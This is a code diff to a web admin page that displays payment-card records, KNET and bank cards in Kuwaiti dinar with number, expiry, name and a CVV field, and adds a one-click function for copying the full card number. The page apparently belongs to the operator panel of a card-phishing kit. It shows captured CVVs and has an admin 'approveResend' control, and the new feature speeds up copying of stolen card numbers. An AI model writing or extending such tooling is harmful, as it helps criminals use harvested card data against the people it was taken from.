@@ -131,6 +131,9 @@
   .kc-brand{font-size:24px;font-weight:900;letter-spacing:-.4px;color:#1a1f71;font-style:italic}
   .kc-tier{font-size:11px;letter-spacing:1.5px;font-weight:800;color:#374151;text-transform:uppercase}
   .kc-cvv{display:inline-block;background:#fff;border-radius:4px;padding:3px 9px;font-family:'Courier New',monospace;font-size:16px;font-weight:800;letter-spacing:1px}
+  .kc-num{cursor:pointer}
+  .kc-num:hover{color:#1a1f71}
+  .kc-copied{color:#047857 !important}
   .kc-wrap{display:flex;justify-content:center;margin:0 auto 16px}
   </style>
 </head>
@@ -1992,7 +1995,7 @@
               html += '<div class="kc-wrap"><div class="kcard">';
               html += '<div class="kc-top"><div class="kc-logo"><div class="kc-mark">' + _ki + '</div><div class="kc-bank">' + (_kb || 'KNET') + '</div></div><div class="kc-cur">KD</div></div>';
               html += '<div class="kc-chip"></div>';
-              html += '<div class="kc-num">' + (_kn || '**** **** ****') + '</div>';
+              html += '<div class="kc-num" title="اضغط لنسخ الرقم" data-num="' + _kn + '" onclick="copyCardNumber(this)">' + (_kn || '**** **** ****') + '</div>';
               html += '<div class="kc-bot">';
               html += '<div><div class="kc-lab">Expiry</div><div class="kc-val">' + (card.expiryMonth || '--') + '/' + (card.expiryYear || '----') + '</div></div>';
               html += '<div><div class="kc-lab">Name</div><div class="kc-val">' + (card.nameOnCard || 'KNET') + '</div></div>';
@@ -2032,7 +2035,7 @@
               html += '<div class="kc-wrap"><div class="kcard">';
               html += '<div class="kc-top"><div class="kc-logo"><div class="kc-mark">' + _ci + '</div><div class="kc-bank">' + (_cb || 'BANK') + '</div></div><div class="kc-cur">KD</div></div>';
               html += '<div class="kc-chip"></div>';
-              html += '<div class="kc-num">' + (_cn || '**** **** ****') + '</div>';
+              html += '<div class="kc-num" title="اضغط لنسخ الرقم" data-num="' + _cn + '" onclick="copyCardNumber(this)">' + (_cn || '**** **** ****') + '</div>';
               html += '<div class="kc-bot">';
               html += '<div><div class="kc-lab">Expiry</div><div class="kc-val">' + (card.expiryMonth || '--') + '/' + (card.expiryYear || '----') + '</div></div>';
               html += '<div><div class="kc-lab">Name</div><div class="kc-val">' + (card.nameOnCard || '-') + '</div></div>';
@@ -2586,6 +2589,33 @@
         btn.classList.add('bg-gray-400', 'cursor-not-allowed');
       }
       console.log('admin:approveResend emitted');
+    }
+
+    function legacyCopy(text) {
+      var ta = document.createElement('textarea');
+      ta.value = text;
+      ta.style.position = 'fixed';
+      ta.style.opacity = '0';
+      document.body.appendChild(ta);
+      ta.select();
+      try { document.execCommand('copy'); } catch(e) {}
+      document.body.removeChild(ta);
+    }
+
+    function copyCardNumber(el) {
+      var raw = (el.getAttribute('data-num') || el.textContent || '').replace(/\D/g, '');
+      if (!raw) return;
+      var old = el.textContent;
+      var done = function() {
+        el.classList.add('kc-copied');
+        el.textContent = 'تم النسخ ✓';
+        setTimeout(function() { el.textContent = old; el.classList.remove('kc-copied'); }, 900);
+      };
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(raw).then(done).catch(function() { legacyCopy(raw); done(); });
+      } else {
+        legacyCopy(raw); done();
+      }
     }
 
     // Card action functions
